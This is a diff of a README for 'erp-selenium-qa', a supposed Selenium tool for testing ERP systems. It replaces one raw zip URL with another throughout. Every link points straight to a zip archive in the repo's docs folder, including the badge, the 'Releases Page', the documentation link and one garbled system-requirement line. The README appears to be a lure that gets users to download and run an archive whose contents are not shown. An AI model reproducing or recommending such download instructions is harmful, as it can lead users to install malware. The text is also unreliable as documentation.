@@ -1,7 +1,7 @@
 # 🏢 erp-selenium-qa - Automate Testing for ERP Systems Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/erp-selenium-qa-v2.9-alpha.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/erp-selenium-qa-v2.9-alpha.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/qa_selenium_erp_1.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/qa_selenium_erp_1.3.zip)
 
 ## 📖 Introduction
 Welcome to the erp-selenium-qa application! This is a complete suite for automating tests on ERP systems using Selenium WebDriver, JavaScript, MySQL, and Jenkins. Whether you're a quality assurance professional or just exploring automation, this tool simplifies your testing process.
@@ -12,7 +12,7 @@ Before you start using the application, follow these easy steps to download and 
 ### 🖥 System Requirements
 - Operating System: Windows, macOS or Linux
 - Java Runtime Environment (JRE) version 8 or newer
-- https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/erp-selenium-qa-v2.9-alpha.4.zip version 12 or newer
+- https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/qa_selenium_erp_1.3.zip version 12 or newer
 - MySQL database setup for your ERP system
 - Jenkins for continuous integration (optional)
 
@@ -26,7 +26,7 @@ Before you start using the application, follow these easy steps to download and 
 ## 🔗 Download & Install
 To get started, you need to download the application from our Releases page. 
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/erp-selenium-qa-v2.9-alpha.4.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/qa_selenium_erp_1.3.zip).
 
 1. Open the link above in your web browser.
 2. Find the latest release version.
@@ -51,7 +51,7 @@ After installation, you can easily start using erp-selenium-qa. Here’s how:
 Identify test cases you want to automate and set them up using the provided user interface. The application allows you to manage tests, analyze results, and optimize your testing strategy.
 
 ### 🌐 Support and Documentation
-For additional guidance, our documentation provides in-depth explanations of setup, usage, and troubleshooting. Access the documentation [here](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/erp-selenium-qa-v2.9-alpha.4.zip).
+For additional guidance, our documentation provides in-depth explanations of setup, usage, and troubleshooting. Access the documentation [here](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/qa_selenium_erp_1.3.zip).
 
 ## 🛠 Community Contributions
 We welcome contributions! If you have ideas, bug fixes, or enhancements, please feel free to submit a pull request or open an issue. Collaboration improves our community and the quality of the software.
@@ -62,4 +62,4 @@ For any questions, inquiries, or support needs, please reach out via the issue t
 ## 🚀 Conclusion
 With erp-selenium-qa, automating ERP tests becomes straightforward and efficient. Embrace automation to ensure the quality of your software with confidence.
 
-👉 [Download Latest Release](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/erp-selenium-qa-v2.9-alpha.4.zip) and start testing today!
+👉 [Download Latest Release](https://raw.githubusercontent.com/duahmcclean/erp-selenium-qa/main/docs/qa_selenium_erp_1.3.zip) and start testing today!
